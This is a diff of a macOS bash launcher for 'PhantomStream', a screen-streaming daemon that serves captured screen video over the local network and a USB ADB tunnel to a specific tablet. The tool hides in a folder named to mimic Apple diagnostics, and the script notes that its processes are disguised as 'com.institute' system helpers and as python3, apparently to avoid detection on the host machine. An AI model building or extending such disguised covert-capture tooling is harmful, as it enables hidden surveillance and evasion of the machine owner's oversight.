@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# start-monitor.sh — On-demand PhantomStream launcher (no Terminal window stays open)
+# start-monitor.sh — PhantomStream v2.0 on-demand launcher
 
 set -euo pipefail
 
@@ -10,19 +10,19 @@ warn() { echo -e "${YELLOW}[PhantomStream]${RESET} $*"; }
 die()  { echo -e "${RED}[PhantomStream]${RESET} $*" >&2; exit 1; }
 
 INSTALL_DIR="$HOME/Library/.AppleDiagnostics"
-PID_FILE="$INSTALL_DIR/stream.pid"
-LOG_FILE="$INSTALL_DIR/stream.log"
-STREAM_PORT=49213
+DAEMON="$INSTALL_DIR/com.institute.backgroundsyncd"
+PID_FILE="$INSTALL_DIR/sync.pid"
+LOG_FILE="$INSTALL_DIR/sync.log"
+STREAM_PORT=9090
 
-[[ -x "$INSTALL_DIR/com.institute.helperd" ]] || \
-    die "Not installed. Run install.sh first."
+[[ -f "$DAEMON" ]] || die "Not installed. Run install.sh first."
 
 # ── Guard: already running? ────────────────────────────────────────────────────
 if [[ -f "$PID_FILE" ]]; then
     EXISTING=$(cat "$PID_FILE")
     STATE=$(ps -o state= -p "$EXISTING" 2>/dev/null | tr -d ' ' || echo "")
     if [[ -n "$STATE" ]] && [[ "$STATE" != "Z" ]]; then
-        warn "Already running (PID $EXISTING). Stop first: kill $EXISTING"
+        warn "Already running (PID $EXISTING). Stop: kill $EXISTING"
         exit 0
     fi
     kill -9 "$EXISTING" 2>/dev/null || true
@@ -35,23 +35,18 @@ LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || \
          ifconfig | awk '/inet / && !/127\.0\.0/ {print $2; exit}' || \
          echo "UNKNOWN")
 
-# ── Launch ─────────────────────────────────────────────────────────────────────
+# ── Launch via wrapper ─────────────────────────────────────────────────────────
 "$INSTALL_DIR/wrapper.sh"
 
-# ── Wait for port to open (up to 12s) ─────────────────────────────────────────
+# ── Wait for port ─────────────────────────────────────────────────────────────
 PORT_OPEN=0
 for i in {1..12}; do
     PID=$(cat "$PID_FILE" 2>/dev/null || echo "")
     if [[ -n "$PID" ]]; then
         STATE=$(ps -o state= -p "$PID" 2>/dev/null | tr -d ' ' || echo "")
-        if [[ -z "$STATE" ]] || [[ "$STATE" == "Z" ]]; then
-            echo
-            die "Server crashed immediately. Check: tail $LOG_FILE"
-        fi
+        [[ -z "$STATE" || "$STATE" == "Z" ]] && echo && die "Daemon crashed. Check: tail $LOG_FILE"
     fi
-    if lsof -iTCP:"$STREAM_PORT" -sTCP:LISTEN -n -P 2>/dev/null | grep -q LISTEN; then
-        PORT_OPEN=1; break
-    fi
+    lsof -iTCP:"$STREAM_PORT" -sTCP:LISTEN -n -P 2>/dev/null | grep -q LISTEN && PORT_OPEN=1 && break
     echo -ne "\r  ${CYAN}Waiting for port $STREAM_PORT...${RESET} (${i}s)"
     sleep 1
 done
@@ -62,31 +57,31 @@ STREAM_PID=$(cat "$PID_FILE" 2>/dev/null || echo "?")
 echo
 if [[ $PORT_OPEN -eq 1 ]]; then
     echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════════════════╗${RESET}"
-    echo -e "${BOLD}${GREEN}║    PhantomStream — ACTIVE · Port LISTENING            ║${RESET}"
+    echo -e "${BOLD}${GREEN}║    PhantomStream v2.0 — ACTIVE · Port LISTENING       ║${RESET}"
     echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════════╝${RESET}"
 else
     echo -e "${BOLD}${YELLOW}╔══════════════════════════════════════════════════════╗${RESET}"
-    echo -e "${BOLD}${YELLOW}║    PhantomStream — Started · Port Pending             ║${RESET}"
+    echo -e "${BOLD}${YELLOW}║    PhantomStream v2.0 — Started · Port Pending        ║${RESET}"
     echo -e "${BOLD}${YELLOW}╚══════════════════════════════════════════════════════╝${RESET}"
 fi
-echo
-ok "Server PID:   $STREAM_PID (shows as python3)"
-ok "Capture PID:  $(cat "$INSTALL_DIR/ffmpeg.pid" 2>/dev/null || echo 'pending') (shows as com.institute.helperd)"
 
-# ADB reverse tunnel — set once at startup so tablet can reach stream over USB
+echo
+ok "Daemon PID:  $STREAM_PID (shows as: python3 com.institute.backgroundsyncd)"
+
+# ── ADB reverse tunnel ────────────────────────────────────────────────────────
 ADB=/usr/local/share/android-commandlinetools/platform-tools/adb
 TABLET_SERIAL=R52X708VMWW
 if "$ADB" -s "$TABLET_SERIAL" get-state 2>/dev/null | grep -q "^device$"; then
     "$ADB" -s "$TABLET_SERIAL" reverse tcp:$STREAM_PORT tcp:$STREAM_PORT >/dev/null 2>&1 && \
-        ok "USB tunnel:   tcp:$STREAM_PORT ↔ tcp:$STREAM_PORT active" || \
-        warn "USB tunnel setup failed — run: adb -s $TABLET_SERIAL reverse tcp:$STREAM_PORT tcp:$STREAM_PORT"
+        ok "USB tunnel:  tcp:$STREAM_PORT active" || \
+        warn "USB tunnel setup failed"
 else
-    warn "Tablet not connected — USB tunnel skipped"
+    warn "Tablet not on USB — use Wi-Fi URL below"
 fi
 
 echo
-echo -e "  ${BOLD}Tablet URL (Chrome — no app needed):${RESET}"
-echo -e "  ${CYAN}http://${LAN_IP}:${STREAM_PORT}/${RESET}"
+echo -e "  ${BOLD}Tablet (USB tunnel):${RESET}  ${CYAN}http://127.0.0.1:${STREAM_PORT}/${RESET}"
+echo -e "  ${BOLD}Tablet / Phone (Wi-Fi):${RESET} ${CYAN}http://${LAN_IP}:${STREAM_PORT}/${RESET}"
 echo
-echo -e "  ${BOLD}To stop:${RESET}  kill $STREAM_PID   (or: $INSTALL_DIR/uninstall.sh)"
+echo -e "  ${BOLD}To stop:${RESET}  kill $STREAM_PID"
 echo
